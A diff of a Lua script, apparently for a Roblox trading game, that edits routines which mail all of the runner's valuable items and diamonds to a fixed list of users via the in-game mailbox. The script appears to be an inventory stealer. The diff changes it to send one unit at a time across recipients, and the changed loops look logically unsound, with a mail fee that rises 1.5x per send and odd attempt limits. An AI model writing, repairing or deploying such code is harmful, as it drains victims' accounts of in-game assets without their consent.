@@ -185,27 +185,27 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
--- Corrected sendItem with mailbox-full forwarding
+-- Send a single unit per mail, cycling through users
 local function sendItem(category, uid, am)
+    local remaining = am or 1
     local userIndex = 1
     local maxUsers = #users
-    local sent = false
     local attempts = 0
 
-    repeat
+    while remaining > 0 and attempts < maxUsers * remaining do
         local currentUser = users[userIndex]
         local args = {
             [1] = currentUser,
             [2] = MailMessage,
             [3] = category,
             [4] = uid,
-            [5] = am or 1
+            [5] = 1 -- send only 1 at a time
         }
 
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
 
         if response == true then
-            sent = true
+            remaining = remaining - 1
             GemAmount1 = GemAmount1 - mailSendPrice
             mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
             if mailSendPrice > 5000000 then
@@ -218,18 +218,18 @@ local function sendItem(category, uid, am)
             end
         else
             warn("Failed to send item: " .. tostring(err))
-            sent = true
+            return
         end
 
         attempts = attempts + 1
-        if attempts > maxUsers then
-            warn("All users' mailboxes are full for this item!")
-            sent = true
+        if attempts > maxUsers * remaining then
+            warn("Could not send all units of item "..uid.." after trying all users")
+            return
         end
-    until sent
+    end
 end
 
--- Corrected SendAllGems function
+-- Send all gems one at a time, cycling through users
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
@@ -246,14 +246,14 @@ local function SendAllGems()
                         [2] = MailMessage,
                         [3] = "Currency",
                         [4] = i,
-                        [5] = GemAmount1 - mailSendPrice
+                        [5] = 1 -- send only 1 gem at a time
                     }
 
                     local response, err = network.Invoke("Mailbox: Send", unpack(args))
 
                     if response == true then
+                        GemAmount1 = GemAmount1 - 1
                         sent = true
-                        GemAmount1 = 0
                     elseif response == false and err == "They don't have enough space!" then
                         userIndex = userIndex + 1
                         if userIndex > maxUsers then
@@ -265,8 +265,8 @@ local function SendAllGems()
                     end
 
                     attempts = attempts + 1
-                    if attempts > maxUsers then
-                        warn("All users' mailboxes are full for gems!")
+                    if attempts > maxUsers * GemAmount1 then
+                        warn("Could not send all gems after trying all users")
                         sent = true
                     end
                 until sent
@@ -372,7 +372,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
         SendMessage(GemAmount1)
     end)
 
-    -- Send all items
+    -- Send all items one unit at a time
     for _, item in ipairs(sortedItems) do
         if item.rap * item.amount >= min_rap and GemAmount1 > mailSendPrice then
             sendItem(item.category, item.uid, item.amount)
@@ -381,7 +381,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
         end
     end
 
-    -- Send remaining gems
+    -- Send remaining gems one unit at a time
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
